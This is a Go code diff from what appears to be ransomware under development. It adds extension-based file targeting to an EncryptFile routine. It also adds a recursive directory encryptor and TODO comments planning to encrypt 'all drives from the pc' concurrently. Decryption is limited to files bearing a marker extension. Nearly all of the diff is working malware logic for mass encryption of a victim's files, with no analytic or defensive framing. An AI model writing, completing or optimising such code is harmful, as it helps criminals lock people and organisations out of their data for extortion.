@@ -35,6 +35,9 @@ func Encrypt(key, data []byte) []byte {
 	return gcm.Seal(nonce, nonce, data, nil)
 }
 
+//TODO: make a function that encrypts specified paths concurrently
+//TODO: make a function that encrypts all drives from the pc (so main would be simpler)
+
 func Decrypt(key, data []byte) []byte {
 	c, err := aes.NewCipher(key)
 	if err != nil {
@@ -64,8 +67,24 @@ func EncryptFile(path string, key []byte) error {
 		return nil
 	}
 
-	//Think of a faster way to get the file's extension
-	//if strings.Split()
+	//This should be a compile time constant so code should get optimized by the compiler
+	//Check if the current's file extension is in the dict or list
+	if UseDict {
+		if extensionDict[GetFileExtensionFastest(path)] != 1 {
+			return nil
+		}
+	} else {
+		Len, Extension := len(extensionsSlice), GetFileExtensionFastest(path)
+		ok := 0
+		for i := 0; i < Len; i++ {
+			if extensionsSlice[i] == Extension {
+				ok = 1
+			}
+		}
+		if ok == 0 {
+			return nil
+		}
+	}
 
 	data, err := ioutil.ReadFile(path)
 	if err != nil {
@@ -89,7 +108,7 @@ func EncryptFile(path string, key []byte) error {
 }
 
 func DecryptFile(path string, key []byte) error {
-	//Do not decrypt anything that doesnt have the specific extension
+	//Do not decrypt anything that doesn't have the specific extension
 	if !strings.HasSuffix(path, extension) {
 		return nil
 	}
@@ -116,6 +135,7 @@ func RecursivelyEncryptDirectory(startingPath string, key []byte) error {
 		if info.IsDir() {
 			return nil
 		}
+		//TODO: Check file size
 		return EncryptFile(path, key)
 	})
 }
